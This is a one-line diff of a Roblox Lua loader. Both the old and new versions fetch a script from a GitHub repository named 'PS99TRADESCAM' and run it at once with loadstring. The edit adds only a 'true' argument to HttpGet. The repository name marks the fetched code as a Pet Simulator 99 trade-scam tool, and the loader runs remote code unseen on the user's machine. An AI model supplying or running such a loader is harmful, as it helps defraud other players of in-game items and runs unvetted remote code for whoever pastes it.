@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/luckwareee/PS99TRADESCAM/main/PS99TRADESCAM")()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/luckwareee/PS99TRADESCAM/main/PS99TRADESCAM" , true ))()
